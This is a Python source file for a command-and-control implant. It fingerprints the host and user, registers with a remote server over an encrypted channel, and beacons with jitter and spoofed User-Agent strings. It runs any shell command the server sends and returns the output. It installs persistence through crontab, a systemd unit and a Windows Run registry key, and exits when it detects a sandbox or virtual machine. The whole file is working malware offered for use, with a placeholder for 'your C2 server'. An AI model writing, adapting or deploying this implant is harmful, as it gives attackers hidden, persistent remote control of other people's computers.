#!/usr/bin/env python3
import platform
import subprocess
import socket
import json
import base64
import time
import random
import os
import sys
import requests
import threading
from datetime import datetime

class C2Implant:
    def __init__(self, server_url):
        self.server_url = server_url
        self.agent_id = None
        self.session_key = None
        self.beacon_interval = 5
        self.jitter = 20
        self.running = True
        self.working_directory = os.getcwd()
        
    def generate_agent_id(self):
        """Generate unique agent ID based on system info"""
        hostname = socket.gethostname()
        username = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'unknown')
        return base64.b64encode(f"{hostname}:{username}:{os.getpid()}".encode()).decode()[:8]
    
    def collect_system_info(self):
        """Collect detailed system information"""
        info = {
            'hostname': socket.gethostname(),
            'username': os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'unknown'),
            'os_type': platform.system(),
            'os_version': platform.version(),
            'architecture': platform.machine(),
            'working_dir': self.working_directory,
            'privilege_level': 'admin' if os.geteuid() == 0 else 'user' if hasattr(os, 'geteuid') else 'unknown',
            'process_id': os.getpid()
        }
        
        # Get network interfaces
        try:
            hostname = socket.gethostname()
            info['ip_address'] = socket.gethostbyname(hostname)
        except:
            info['ip_address'] = '127.0.0.1'
        
        return info
    
    def execute_command(self, command):
        """Execute system command and return output"""
        try:
            # Handle cd command
            if command.startswith('cd '):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    self.working_directory = os.getcwd()
                    return f"Changed directory to {self.working_directory}"
                except Exception as e:
                    return f"Failed to change directory: {str(e)}"
            
            # Execute other commands
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=self.working_directory
            )
            
            output = result.stdout if result.stdout else result.stderr
            if not output:
                output = "[+] Command executed successfully (no output)"
            
            return output
            
        except subprocess.TimeoutExpired:
            return "[-] Command timed out after 30 seconds"
        except Exception as e:
            return f"[-] Error executing command: {str(e)}"
    
    def establish_encryption(self):
        """Establish encrypted channel with server"""
        try:
            # Get server config
            response = requests.get(f"{self.server_url}/api/implant/config", verify=False)
            config = response.json()
            
            # Generate session key
            import Crypto.Random
            from Crypto.PublicKey import RSA
            from Crypto.Cipher import PKCS1_OAEP
            
            session_key = Crypto.Random.get_random_bytes(32)
            
            # Encrypt session key with server's public key
            server_public_key = RSA.import_key(base64.b64decode(config['server_public_key']))
            cipher_rsa = PKCS1_OAEP.new(server_public_key)
            encrypted_session_key = base64.b64encode(cipher_rsa.encrypt(session_key)).decode()
            
            # Collect and encrypt system info
            system_info = json.dumps(self.collect_system_info())
            from Crypto.Cipher import AES
            cipher_aes = AES.new(session_key, AES.MODE_GCM)
            ciphertext = cipher_aes.encrypt(system_info.encode())
            tag = cipher_aes.digest()
            nonce = cipher_aes.nonce
            encrypted_info = base64.b64encode(nonce + ciphertext + tag).decode()
            
            # Register with server
            register_data = {
                'session_key': encrypted_session_key,
                'agent_info': encrypted_info
            }
            
            response = requests.post(
                f"{self.server_url}/api/register",
                json=register_data,
                verify=False,
                headers={'User-Agent': self.random_user_agent()}
            )
            
            if response.status_code == 200:
                self.agent_id = response.json()['agent_id']
                self.session_key = session_key
                return True
            else:
                return False
                
        except Exception as e:
            print(f"Encryption setup failed: {e}")
            return False
    
    def random_user_agent(self):
        """Random User-Agent for evasion"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
        ]
        return random.choice(agents)
    
    def encrypt_data(self, data):
        """Encrypt data with AES-GCM"""
        from Crypto.Cipher import AES
        cipher = AES.new(self.session_key, AES.MODE_GCM)
        ciphertext = cipher.encrypt(json.dumps(data).encode())
        tag = cipher.digest()
        nonce = cipher.nonce
        return base64.b64encode(nonce + ciphertext + tag).decode()
    
    def decrypt_data(self, encrypted_data):
        """Decrypt server response"""
        from Crypto.Cipher import AES
        raw = base64.b64decode(encrypted_data)
        nonce = raw[:16]
        ciphertext = raw[16:-16]
        tag = raw[-16:]
        cipher = AES.new(self.session_key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return json.loads(plaintext.decode())
    
    def calculate_sleep(self):
        """Calculate next beacon time with jitter"""
        jitter_range = int(self.beacon_interval * self.jitter / 100)
        jitter_amount = random.randint(-jitter_range, jitter_range)
        return max(1, self.beacon_interval + jitter_amount)
    
    def beacon(self):
        """Main beacon loop"""
        while self.running:
            try:
                # Prepare beacon data
                beacon_data = {
                    'timestamp': datetime.now().isoformat(),
                    'working_dir': self.working_directory
                }
                
                encrypted_data = self.encrypt_data(beacon_data)
                
                # Send beacon
                response = requests.post(
                    f"{self.server_url}/api/beacon",
                    json={'agent_id': self.agent_id, 'data': encrypted_data},
                    verify=False,
                    headers={'User-Agent': self.random_user_agent()},
                    timeout=30
                )
                
                if response.status_code == 200:
                    server_response = response.json()
                    decrypted_response = self.decrypt_data(server_response['data'])
                    
                    # Update configuration
                    if 'sleep_time' in decrypted_response:
                        self.beacon_interval = decrypted_response['sleep_time']
                    if 'jitter' in decrypted_response:
                        self.jitter = decrypted_response['jitter']
                    
                    # Execute tasks
                    for task in decrypted_response.get('tasks', []):
                        self.process_task(task)
                
                # Sleep with jitter
                sleep_time = self.calculate_sleep()
                time.sleep(sleep_time)
                
            except requests.exceptions.RequestException as e:
                time.sleep(30)
            except Exception as e:
                time.sleep(60)
    
    def process_task(self, task):
        """Process individual task from server"""
        try:
            task_id = task['task_id']
            command = task['command']
            task_type = task.get('type', 'shell')
            
            # Execute command
            output = self.execute_command(command)
            
            # Send result
            result_data = {
                'task_id': task_id,
                'status': 'completed',
                'output': output
            }
            
            encrypted_result = self.encrypt_data(result_data)
            
            requests.post(
                f"{self.server_url}/api/task_result",
                json={'agent_id': self.agent_id, 'data': encrypted_result},
                verify=False,
                headers={'User-Agent': self.random_user_agent()}
            )
            
        except Exception as e:
            # Send error result
            error_result = {
                'task_id': task_id,
                'status': 'failed',
                'output': str(e)
            }
            encrypted_error = self.encrypt_data(error_result)
            try:
                requests.post(
                    f"{self.server_url}/api/task_result",
                    json={'agent_id': self.agent_id, 'data': encrypted_error},
                    verify=False
                )
            except:
                pass
    
    def persistence_linux(self):
        """Establish persistence on Linux systems"""
        try:
            # Add to crontab
            cron_line = f"@reboot python3 {os.path.abspath(__file__)} > /dev/null 2>&1"
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True)
            
            # Add to systemd service
            service_content = f"""[Unit]
Description=C2 Agent
After=network.target

[Service]
ExecStart=/usr/bin/python3 {os.path.abspath(__file__)}
Restart=always
User={os.getlogin()}

[Install]
WantedBy=multi-user.target
"""
            with open('/etc/systemd/system/c2agent.service', 'w') as f:
                f.write(service_content)
            subprocess.run('systemctl enable c2agent.service', shell=True)
            
            return True
        except:
            return False
    
    def persistence_windows(self):
        """Establish persistence on Windows"""
        try:
            import _winreg
            key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, 
                                  r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                  0, _winreg.KEY_SET_VALUE)
            _winreg.SetValueEx(key, "C2Agent", 0, _winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))
            _winreg.CloseKey(key)
            return True
        except:
            return False
    
    def run(self):
        """Main execution entry point"""
        # Check for sandbox/debug
        if self.check_sandbox():
            sys.exit(0)
        
        # Establish encrypted communication
        if not self.establish_encryption():
            sys.exit(1)
        
        # Establish persistence based on OS
        if platform.system() == 'Linux':
            self.persistence_linux()
        elif platform.system() == 'Windows':
            self.persistence_windows()
        
        # Start beaconing
        self.beacon()
    
    def check_sandbox(self):
        """Basic sandbox detection"""
        # Check for common sandbox indicators
        sandbox_indicators = [
            os.path.exists('/.dockerenv'),
            os.path.exists('/.dockerinit'),
            'vbox' in platform.uname().version.lower(),
            'vmware' in platform.uname().version.lower()
        ]
        
        # Check uptime (sandboxes often have low uptime)
        if platform.system() == 'Linux':
            with open('/proc/uptime', 'r') as f:
                uptime_seconds = float(f.read().split()[0])
                if uptime_seconds < 600:  # Less than 10 minutes
                    sandbox_indicators.append(True)
        
        return any(sandbox_indicators)

if __name__ == '__main__':
    # Disable SSL warnings for testing
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Server URL (change to your C2 server)
    SERVER_URL = "https://192.168.1.100:443"  # Replace with your server IP
    
    implant = C2Implant(SERVER_URL)
    implant.run()
